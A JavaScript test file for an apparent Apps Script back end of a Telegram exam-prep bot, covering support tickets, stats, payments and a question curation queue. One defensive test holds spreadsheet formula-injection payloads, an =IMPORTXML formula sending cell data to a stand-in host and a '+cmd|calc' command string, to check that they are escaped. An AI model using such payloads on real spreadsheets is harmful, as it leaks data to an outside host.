test('closing a ticket nobody picked up records the closer as the one who picked it up', () => {
  const script = freshScript();
  script.createTicket(newTicket());
  const closed = script.setTicketStatus('T-260917-AB2C', 'closed', '@ravi');
  assert.equal(closed.picked_up_by, '@ravi');
});

test('a closed ticket reopens as in progress, waiting on an admin, when the student writes again', () => {
  const script = freshScript();
  script.createTicket(newTicket());
  script.appendTicketMessage('T-260917-AB2C', 'Admin @ravi', 'fixed', '', '@ravi');
  script.setTicketStatus('T-260917-AB2C', 'closed', '@ravi');

  const reopened = script.appendTicketMessage('T-260917-AB2C', 'A Student', 'broken again');
  assert.equal(reopened.status, 'in_progress');
  assert.equal(reopened.waiting_on, 'admin');
  assert.equal(reopened.times_reopened, 1);
  assert.equal(reopened.closed_by, '');
  assert.equal(reopened.closed_at, '');
});

test('an admin reopening a closed ticket makes it in progress and waiting on an admin; "open" is treated as reopen', () => {
  const script = freshScript();
  script.createTicket(newTicket());
  script.setTicketStatus('T-260917-AB2C', 'closed', '@ravi');
  const reopened = script.setTicketStatus('T-260917-AB2C', 'open', '@sita');
  assert.equal(reopened.status, 'in_progress');
  assert.equal(reopened.waiting_on, 'admin');
  assert.equal(reopened.times_reopened, 1);
  assert.throws(() => script.setTicketStatus('T-260917-AB2C', 'deleted', '@x'), /Status must be one of/);
  assert.equal(script.setTicketStatus('T-000000-NONE', 'closed', '@x'), null);
});

test('listTickets counts every queue and filters by who has to act, longest waiting first', () => {
  const script = freshScript();
  script.createTicket(newTicket({ ticket_id: 'T-260917-AAAA', telegram_id: '1' }));
  script.createTicket(newTicket({ ticket_id: 'T-260917-BBBB', telegram_id: '2' }));
  script.createTicket(newTicket({ ticket_id: 'T-260917-CCCC', telegram_id: '3' }));
  script.appendTicketMessage('T-260917-BBBB', 'Admin @r', 'hi', '', '@r');
  script.setTicketStatus('T-260917-CCCC', 'closed', '@r');

  const all = script.listTickets({});
  assert.deepEqual({ ...all.counts }, { open: 1, in_progress: 1, closed: 1, total: 3, needs_reply: 1, waiting_student: 1 });
  assert.deepEqual(Array.from(script.listTickets({ waitingOn: 'admin' }).tickets, (t) => t.ticket_id), ['T-260917-AAAA']);
  assert.deepEqual(Array.from(script.listTickets({ status: 'answered' }).tickets, (t) => t.ticket_id), ['T-260917-BBBB'],
    'the old status name still filters');
  assert.equal(script.listTickets({ waitingOn: 'admin', sort: 'waiting' }).total, 1);
});

test('getSupportStats reports queues, today, response times, categories and each admin', () => {
  const script = freshScript();
  script.createTicket(newTicket({ ticket_id: 'T-260917-AAAA', telegram_id: '1', category: 'payment' }));
  script.createTicket(newTicket({ ticket_id: 'T-260917-BBBB', telegram_id: '2', category: 'invite' }));
  script.createTicket(newTicket({ ticket_id: 'T-260917-CCCC', telegram_id: '3', category: 'invite' }));
  script.appendTicketMessage('T-260917-BBBB', 'Admin @ravi', 'hi', '', '@ravi');
  script.appendTicketMessage('T-260917-CCCC', 'Admin @sita', 'done', '', '@sita', 'quick_reply:qr_resolved');
  script.setTicketStatus('T-260917-CCCC', 'closed', '@sita');

  const stats = script.getSupportStats({ days: 30 });
  assert.equal(stats.counts.total, 3);
  assert.equal(stats.counts.open, 1);
  assert.equal(stats.counts.in_progress, 1);
  assert.equal(stats.counts.closed, 1);
  assert.equal(stats.counts.needs_reply, 1);
  assert.equal(stats.not_picked_up, 1);
  assert.equal(stats.opened_today, 3);
  assert.equal(stats.closed_today, 1);
  assert.equal(stats.first_reply_minutes.samples, 2);
  assert.equal(stats.close_hours.samples, 1);
  assert.equal(stats.oldest_needs_reply.ticket_id, 'T-260917-AAAA');
  assert.deepEqual({ ...stats.by_category.invite }, { open: 0, in_progress: 1, closed: 1, total: 2 });
  assert.equal(stats.by_admin['@ravi'].replies, 1);
  assert.equal(stats.by_admin['@ravi'].picked_up, 1);
  assert.equal(stats.by_admin['@sita'].quick_replies, 1);
  assert.equal(stats.by_admin['@sita'].closed, 1);
});

test('text a student controls can never become a formula in the sheet', () => {
  const script = freshScript();
  const evil = '=IMPORTXML("https://evil.example/?"&A1,"//x")';
  script.createTicket(newTicket({ name: evil, username: '', message: '+cmd|calc' }));
  script.appendTicketMessage('T-260917-AB2C', '-student', '@SUM(1)');
  script.upsertSubscriber({ telegram_id: '99', name: evil, username: 'x', plan_label: '=1+1', notes: '-note', status: 'active' });

  const support = script.book().getSheetByName('Support');
  const stored = support.values[1];
  // The fake sheet strips the apostrophe on write, like Sheets, so check what was written.
  const writtenName = script.safeCell(evil);
  assert.equal(writtenName, "'" + evil);
  assert.equal(script.safeCell('hello'), 'hello');
  assert.equal(script.safeCell(5), 5);

  // Read back, the values are exactly what the student sent.
  const ticket = script.getTicket('T-260917-AB2C');
  assert.equal(ticket.name, evil);
  assert.equal(ticket.last_message, '@SUM(1)');
  assert.equal(stored[5], evil);
  const member = script.getSubscriber('99');
  assert.equal(member.name, evil);
  assert.equal(member.plan_label, '=1+1');

  const logWho = script.book().getSheetByName('Support Log').values.slice(1).map((r) => r[3]);
  assert.ok(logWho.every((v) => typeof v === 'string'));
});

test('findPaymentRecord finds a payment in the log first, then on a member row', () => {
  const script = freshScript();
  script.logPayment({ telegram_id: '42', plan: 'exam_pass', amount: 199, payment_id: 'pay_LOGGED000001', event: 'payment_link.paid' });
  script.upsertSubscriber({ telegram_id: '43', status: 'active', payment_id: 'pay_ONROW0000001', amount: 199 });

  assert.equal(script.findPaymentRecord('pay_LOGGED000001').telegram_id, '42');
  assert.equal(script.findPaymentRecord('pay_LOGGED000001').source, 'Payments');
  assert.equal(script.findPaymentRecord('pay_ONROW0000001').telegram_id, '43');
  assert.equal(script.findPaymentRecord('pay_ONROW0000001').source, 'Subscribers');
  assert.equal(script.findPaymentRecord('pay_NOWHERE00001'), null);
  assert.equal(script.findPaymentRecord(''), null);
});

// ===========================================================================
// The curation queue
// ===========================================================================
// The Apps Script and the direct Sheets client share every sheet, so a curator
// on one route must not see different behaviour from a curator on the other.
// These mirror the cases in test/sheets-direct.test.js one for one.

/** A subject tab holding `n` questions, and the script that reads it. */
function tabWithQuestions(n, overrides = []) {
  const s = freshScript();
  const sheet = new FakeSheet('Polity', [s.QUESTION_HEADERS.slice()]);
  const script = loadScript(new FakeSpreadsheet([sheet]));

  const rows = [];
  for (let i = 0; i < n; i++) {
    rows.push({
      question: `Q${i + 1}?`, option_a: 'a', option_b: 'b', option_c: 'c', option_d: 'd',
      correct_answer: 'A'
    });
  }
  script.appendQuestionsToSheet('Polity', rows, 'Curator', true);

  const map = script.headerMap(sheet);
  overrides.forEach((patch, i) => {
    Object.entries(patch).forEach(([header, value]) => { sheet.values[i + 1][map[header]] = value; });
  });

  const ids = sheet.values.slice(1).map((row) => String(row[map['Question ID']]));
  return { script, sheet, map, ids };
}

test('queueing marks the rows Scheduled, stamps the time, and names what it missed', () => {
  const { script, sheet, map, ids } = tabWithQuestions(2);

  const res = script.scheduleQuestionRows('Polity', [ids[0], ids[1], 'POL-9999'],
    '07-09-2026 09:00 IST', 'Curator (c@x)');

  assert.equal(res.updatedCount, 2);
  assert.deepEqual([...res.notFound], ['POL-9999']);
  assert.equal(res.skipped.length, 0);
  assert.equal(sheet.values[1][map['Status']], 'Scheduled');
  assert.equal(sheet.values[1][map['Scheduled For']], '07-09-2026 09:00 IST');
  assert.equal(sheet.values[1][map['Updated By']], 'Curator (c@x)');
});

test('queueing refuses a posted, sending or held row, exactly as the direct client does', () => {
  const { script, sheet, map, ids } = tabWithQuestions(4, [
    { Posted: 'YES', Status: 'Posted' },
    { Posted: 'SENDING | x | Approved', Status: 'Sending' },
    { Posted: 'CHECK | x', Status: 'Sending' }
  ]);

  const res = script.scheduleQuestionRows('Polity', ids, '', 'Curator');

  assert.equal(res.updatedCount, 1);
  assert.deepEqual([...res.skipped].map((s) => s.reason),
    ['already posted', 'being sent right now', 'held for checking']);
  assert.equal(sheet.values[1][map['Status']], 'Posted');
  assert.equal(sheet.values[4][map['Status']], 'Scheduled');
});

test('unqueueing restores the status and clears the target time', () => {
  const { script, sheet, map, ids } = tabWithQuestions(1, [
    { Status: 'Scheduled', 'Scheduled For': '07-09-2026 09:00 IST' }
  ]);

  const res = script.unscheduleQuestionRows('Polity', [ids[0]], 'Approved', 'Curator');

  assert.equal(res.updatedCount, 1);
  assert.equal(sheet.values[1][map['Status']], 'Approved');
  assert.equal(sheet.values[1][map['Scheduled For']], '');
});

test('unqueueing will not hand a row one of the statuses the poster owns', () => {
  const { script, ids } = tabWithQuestions(1, [{ Status: 'Scheduled' }]);
  assert.throws(() => script.unscheduleQuestionRows('Polity', [ids[0]], 'Posted', 'C'),
    /set by the poster/);
});

test('bulkStatus may archive a posted question but never re-queue one', () => {
  const { script, sheet, map, ids } = tabWithQuestions(1, [{ Posted: 'YES', Status: 'Posted' }]);

  assert.equal(script.bulkSetStatus('Polity', [ids[0]], 'Archived', 'C').updatedCount, 1);
  assert.equal(sheet.values[1][map['Status']], 'Archived');

  // Back to posted, then ask to queue it: that is the one the queue refuses.
  sheet.values[1][map['Status']] = 'Posted';
  const queued = script.scheduleQuestionRows('Polity', [ids[0]], '', 'C');
  assert.equal(queued.updatedCount, 0);
  assert.equal(queued.skipped[0].reason, 'already posted');
});

test('an id repeated in one request is written once', () => {
  const { script, ids } = tabWithQuestions(1);
  const res = script.scheduleQuestionRows('Polity', [ids[0], ids[0], ' ' + ids[0] + ' '], '', 'C');
  assert.equal(res.updatedCount, 1);
});

test('the queue actions are reachable over POST and answer with what they missed', () => {
  const { script, ids } = tabWithQuestions(2);
  const post = (payload) => JSON.parse(script.doPost({ postData: { contents: JSON.stringify(payload) } }).text);

  const queued = post({ action: 'scheduleQuestions', subject: 'Polity', questionIds: [ids[0], 'NOPE'], scheduledFor: 'soon' });
  assert.equal(queued.success, true);
  assert.equal(queued.updatedCount, 1);
  assert.deepEqual([...queued.notFound], ['NOPE']);

  const undone = post({ action: 'unscheduleQuestions', subject: 'Polity', questionIds: [ids[0]] });
  assert.equal(undone.success, true);
  assert.equal(undone.updatedCount, 1);

  const missing = post({ action: 'unscheduleQuestions', subject: 'Polity', questionIds: [] });
  assert.equal(missing.success, false);
  assert.match(missing.error, /Missing subject or questionIds/);
});

// ===========================================================================
// A poll deleted from Telegram
// ===========================================================================
// Mirrors the cases in test/sheets-direct.test.js: the two routes share every
// sheet, so a curator must not be able to tell which one marked a row.

test('a deleted poll is marked Deleted and keeps Posted = YES, so it is never re-sent', () => {
  const { script, sheet, map } = tabWithQuestions(1, [
    { Posted: 'YES', Status: 'Posted', 'Telegram Msg ID': 901 }
  ]);

  assert.equal(script.markQuestionsDeleted('Polity', [2], 'Deleted from the Telegram group'), 1);

  assert.equal(sheet.values[1][map['Status']], 'Deleted');
  assert.equal(sheet.values[1][map['Posted']], 'YES',
    'clearing Posted would put the question back in the queue and post it again');
  assert.equal(sheet.values[1][map['Telegram Msg ID']], 901);
  assert.equal(sheet.values[1][map['Updated By']], 'Deleted-poll check');
  assert.match(String(sheet.values[1][map['Review Notes']]), /^\[.* IST\] Deleted from the Telegram group$/);
});

test('a note is added to whatever the row already said, not over it', () => {
  const { script, sheet, map } = tabWithQuestions(1, [
    { Posted: 'YES', Status: 'Posted', 'Review Notes': 'checked by Ravi' }
  ]);
  script.markQuestionsDeleted('Polity', [2], 'Deleted from the Telegram group');
  assert.match(String(sheet.values[1][map['Review Notes']]), /^checked by Ravi\n\[.* IST\] Deleted from/);
});

test('marking skips a row that is not posted, and one already marked', () => {
  const { script, sheet, map } = tabWithQuestions(3, [
    { Posted: 'NO', Status: 'Approved' },
    { Posted: 'YES', Status: 'Deleted' },
    { Posted: 'YES', Status: 'Posted' }
  ]);

  assert.equal(script.markQuestionsDeleted('Polity', [2, 3, 4], 'gone'), 1);
  assert.equal(sheet.values[1][map['Status']], 'Approved');
  assert.equal(sheet.values[3][map['Status']], 'Deleted');
});

test('a marked question is not offered to the next sweep', () => {
  const { script } = tabWithQuestions(2, [
    { Posted: 'YES', Status: 'Posted', 'Telegram Msg ID': 901 },
    { Posted: 'YES', Status: 'Deleted', 'Telegram Msg ID': 902 }
  ]);
  const posted = script.listPostedQuestions('Polity');
  assert.deepEqual([...posted].map((p) => p.message_id), ['901']);
});

test('Deleted is a status the poster owns, not one a curator sets by hand', () => {
  const { script, ids } = tabWithQuestions(1);
  assert.throws(() => script.bulkSetStatus('Polity', [ids[0]], 'Deleted', 'C'), /set by the poster/);
});

test('markDeleted is reachable over POST and refuses an empty selection', () => {
  const { script } = tabWithQuestions(1, [{ Posted: 'YES', Status: 'Posted' }]);
  const post = (payload) => JSON.parse(script.doPost({ postData: { contents: JSON.stringify(payload) } }).text);

  const marked = post({ action: 'markDeleted', subject: 'Polity', rowNumbers: [2], note: 'gone' });
  assert.equal(marked.success, true);
  assert.equal(marked.markedCount, 1);

  const empty = post({ action: 'markDeleted', subject: 'Polity', rowNumbers: [] });
  assert.equal(empty.success, false);
  assert.match(empty.error, /Missing subject or rowNumbers/);
});
